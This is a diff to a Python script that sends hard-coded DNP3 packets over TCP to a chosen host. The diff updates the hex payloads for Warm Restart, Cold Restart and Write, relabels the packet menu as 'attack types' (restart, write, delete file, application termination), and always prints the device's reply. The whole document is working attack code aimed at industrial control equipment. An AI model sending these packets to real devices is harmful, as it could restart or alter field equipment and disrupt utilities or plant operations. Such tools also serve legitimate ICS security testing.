@@ -24,9 +24,9 @@ dnp3_ReadRequest="056405c903000400bd71"
 
 dnp3_list=[
            "056405c001000004e921",  #dnp3_HealthCheck
-           "056408c401000200390ddece0e6cd1", #dnp3_WarmRestart
-           "056408c401000200390ddece0d8E8B", #dnp3_ColdRestart
-           "056408c401000200390ddece029df7", #dnp3_Write
+           "056408c40a000100fc42c0c00e7edc", #dnp3_WarmRestart
+           "056408c40a000100fc42c0c00d9c86", #dnp3_ColdRestart
+           "056412c403000400152dc1c10232010701fa7d0b460d01c863", #dnp3_Write
            "056408c401000200390ddece0f32e7", #dnp3_InitData
            "056408c401000200390ddece12f645", #dnp3_AppTermination
            "056408c401000200390ddece1b218c", #dnp3_DeleteFile
@@ -46,7 +46,13 @@ def usage():
     -p / --prot :destination port
     -t / --type: DNP3 PDU tye
 
-Defined DNP3 packet for parmater -t / --type:
+    """)
+    print_attack_type()
+
+
+def print_attack_type():
+    print(u"""
+Defined DNP3 attack type:
 '1: Health check'
 '2: Warm Restart'
 '3: Cold Restart'
@@ -56,8 +62,8 @@ Defined DNP3 packet for parmater -t / --type:
 '6: App function termination'
 '7: Delete file'
 '8: Request Link'
-
     """)
+
 
 def debug(msg):
     if DEBUG == 1:
@@ -71,9 +77,9 @@ def send_dnp3_packet(socket, dnp3_type = 8):
     socket.sendall(unhexlify(dnp3_pdu))
 
     #get response
-    if (8 == int(dnp3_type)):
-        resp = socket.recv(BUFSIZ)
-        print("Received DNP3 Response from %s: %s" % (HOST, resp.encode('hex')))
+    #if (8 == int(dnp3_type)):
+    resp = socket.recv(BUFSIZ)
+    print("Received DNP3 Response from %s: %s" % (HOST, resp.encode('hex')))
  
 
 def debug(msg):
@@ -132,6 +138,8 @@ def main(argv):
     tcpCliSock.close()
 
 if __name__ == "__main__":
+
+    print_attack_type()
 
     if len(sys.argv) <= 1:  
          usage()
